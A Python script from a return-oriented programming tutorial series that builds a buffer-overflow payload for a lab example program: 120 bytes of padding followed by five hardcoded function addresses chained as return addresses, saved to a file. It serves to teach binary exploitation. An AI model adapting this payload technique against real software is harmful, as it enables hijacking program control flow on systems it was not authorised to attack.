#!/usr/bin/env python3

import struct

# Link: https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/30/return-oriented-programming-part2.html 
# This script generates payload to exploit the program in Example-2

def exploit() :
    
    # The stack is like this: 
    #
    #   < buffer - 100 bytes > < padding - 'x' bytes > < Old Base Pointer - 8 bytes > <Return Address - 8 bytes >
    #   ^                                                                            ^
    #   |                                                                            |
    #   |                                                                            |
    #   A                                                                            B

    # Open up gdb or a tool you are comfortable with and find this. 
    # junk_length = buffer's starting address - ReturnAddress's stack address
    junk_length = 120

    payload = bytes()

    # Initial Payload
    # Gap between point A and point B
    payload = b'a' * junk_length

    
    # inst1()'s address
    inst1_address = 0x0000000000400526
    # inst1()'s address in little-endian byte order.
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst1_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst1_address)
    

    # inst2()'s address
    inst2_address = 0x0000000000400534
    # inst2()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst2_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst2_address)


    # inst3()'s address
    inst3_address = 0x0000000000400543
    # inst3()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst3_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst3_address)

    # inst4()'s address
    inst4_address = 0x0000000000400551
    # inst4()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst4_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst4_address)

    # inst5()'s address
    inst5_address = 0x000000000040055f
    # inst5()'s address in little-endian byte order
    # For 64-bit executables, 
    payload += struct.pack('<Q', inst5_address)

    # For 32-bit executables, 
    # payload += struct.pack('<I', inst5_address)


    # Write the payload into a file - payload.txt
    fo = open("payload.txt", "wb")
    fo.write(payload)
    fo.close()
    
    print("Payload saved in file: payload.txt")

if __name__ == "__main__": 
    exploit()
